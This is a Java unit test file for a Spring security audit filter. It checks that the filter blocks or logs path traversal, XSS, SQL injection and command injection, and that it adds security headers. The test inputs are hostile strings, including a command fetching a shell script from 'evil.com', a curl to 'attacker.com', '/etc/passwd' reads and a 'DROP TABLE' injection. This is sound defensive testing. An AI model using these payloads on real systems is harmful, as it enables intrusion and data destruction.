package com.nexgenai.security;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import org.mockito.InjectMocks;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;
import org.junit.jupiter.api.extension.ExtendWith;
import org.springframework.mock.web.MockFilterChain;
import org.springframework.mock.web.MockHttpServletRequest;
import org.springframework.mock.web.MockHttpServletResponse;

import static org.junit.jupiter.api.Assertions.*;
import static org.mockito.ArgumentMatchers.*;
import static org.mockito.Mockito.*;

@ExtendWith(MockitoExtension.class)
@DisplayName("SecurityAuditFilter — unit tests")
class SecurityAuditFilterTest {

    @Mock  private SecurityEventLogger eventLogger;
    @InjectMocks private SecurityAuditFilter filter;

    private MockHttpServletRequest  req;
    private MockHttpServletResponse res;
    private MockFilterChain         chain;

    @BeforeEach
    void setUp() {
        req   = new MockHttpServletRequest();
        res   = new MockHttpServletResponse();
        chain = new MockFilterChain();
        req.setRemoteAddr("127.0.0.1");
    }

    // ── Path traversal in URI ────────────────────────────────────────────────

    @ParameterizedTest(name = "URI contains path traversal: {0}")
    @ValueSource(strings = {
        "/api/v1/../etc/passwd",
        "/api/v1/%2e%2e/secret",
        "/uploads/..%2Fetc%2Fpasswd",
        "/api/v1/%252e/config"
    })
    @DisplayName("Path traversal in URI → HTTP 400 + logger called")
    void pathTraversalInUri_blocks400(String uri) throws Exception {
        req.setRequestURI(uri);

        filter.doFilterInternal(req, res, chain);

        assertEquals(400, res.getStatus());
        assertNull(chain.getRequest(), "Filter chain must NOT proceed");
        verify(eventLogger, atLeastOnce()).pathTraversal(anyString(), anyString(), eq(uri));
    }

    // ── XSS in query parameters ──────────────────────────────────────────────

    @ParameterizedTest(name = "XSS payload: {0}")
    @ValueSource(strings = {
        "<script>alert(1)</script>",
        "javascript:alert(1)",
        "<iframe src='x'>",
        "onload=alert(1)",
        "expression(alert(1))",
        "data:text/html,<script>alert(1)</script>"
    })
    @DisplayName("XSS in query param → HTTP 400 + xssAttempt logged")
    void xssInQueryParam_blocks400(String payload) throws Exception {
        req.setRequestURI("/api/v1/jobs");
        req.addParameter("q", payload);

        filter.doFilterInternal(req, res, chain);

        assertEquals(400, res.getStatus());
        assertNull(chain.getRequest(), "Filter chain must NOT proceed");
        verify(eventLogger, atLeastOnce())
            .xssAttempt(anyString(), anyString(), anyString(), anyString(), contains(payload.substring(0, 5)));
    }

    // ── SQL injection in query params ────────────────────────────────────────

    @ParameterizedTest(name = "SQLi payload: {0}")
    @ValueSource(strings = {
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "1 UNION SELECT * FROM users",
        "' OR 1=1 --",
        "user' -- ",
        "1; EXEC xp_cmdshell('dir')"
    })
    @DisplayName("SQL injection in query param → logged (not blocked for SQLI), chain proceeds")
    void sqlInjectionInQueryParam_logsAndContinues(String payload) throws Exception {
        req.setRequestURI("/api/v1/jobs");
        req.addParameter("search", payload);

        filter.doFilterInternal(req, res, chain);

        // SQLI is logged but does NOT block (400 is only for XSS/CMD/PATH)
        verify(eventLogger, atLeastOnce())
            .sqlInjectionAttempt(anyString(), anyString(), anyString(), anyString(), anyString());
    }

    // ── Command injection ─────────────────────────────────────────────────────

    @ParameterizedTest(name = "CMD payload: {0}")
    @ValueSource(strings = {
        "; ls -la",
        "| cat /etc/passwd",
        "& wget http://evil.com/shell.sh",
        "`bash -i`",
        "$curl attacker.com"
    })
    @DisplayName("Command injection in query param → HTTP 400")
    void cmdInjectionInQueryParam_blocks400(String payload) throws Exception {
        req.setRequestURI("/api/v1/jobs");
        req.addParameter("cmd", payload);

        filter.doFilterInternal(req, res, chain);

        assertEquals(400, res.getStatus());
        assertNull(chain.getRequest(), "Filter chain must NOT proceed");
    }

    // ── Security headers added to every response ─────────────────────────────

    @Test
    @DisplayName("Clean request → security headers present in response")
    void cleanRequest_securityHeadersAdded() throws Exception {
        req.setRequestURI("/api/v1/jobs");

        filter.doFilterInternal(req, res, chain);

        assertEquals("nosniff",   res.getHeader("X-Content-Type-Options"));
        assertEquals("DENY",      res.getHeader("X-Frame-Options"));
        assertEquals("1; mode=block", res.getHeader("X-XSS-Protection"));
        assertEquals("no-store",  res.getHeader("Cache-Control"));
        assertNotNull(res.getHeader("Referrer-Policy"));
        assertNotNull(res.getHeader("Permissions-Policy"));
    }

    // ── Static resource bypass ────────────────────────────────────────────────

    @Test
    @DisplayName("Actuator health endpoint → skipped, no header injection")
    void actuatorHealth_skipsFilterLogic() throws Exception {
        req.setRequestURI("/actuator/health");

        filter.doFilterInternal(req, res, chain);

        assertNotNull(chain.getRequest(), "Chain should proceed for health endpoint");
        assertNull(res.getHeader("X-Content-Type-Options"),
            "Security headers must not be added to health check bypassed request");
    }

    // ── XSS in header (log-only, no block) ───────────────────────────────────

    @Test
    @DisplayName("XSS in User-Agent header → logged but NOT blocked")
    void xssInUserAgent_loggedNotBlocked() throws Exception {
        req.setRequestURI("/api/v1/jobs");
        req.addHeader("User-Agent", "<script>alert('xss')</script>");

        filter.doFilterInternal(req, res, chain);

        // Headers are log-only — request must proceed
        assertNotNull(chain.getRequest(), "Chain must proceed even for suspicious User-Agent");
        verify(eventLogger, atLeastOnce())
            .xssAttempt(anyString(), anyString(), anyString(), contains("header:User-Agent"), anyString());
    }

    // ── Clean request passes through ─────────────────────────────────────────

    @Test
    @DisplayName("Clean request → chain proceeds, no event logged")
    void cleanRequest_chainProceeds() throws Exception {
        req.setRequestURI("/api/v1/jobs");
        req.addParameter("status", "ACTIVE");

        filter.doFilterInternal(req, res, chain);

        assertNotNull(chain.getRequest(), "Chain must proceed for clean request");
        verifyNoInteractions(eventLogger);
    }
}
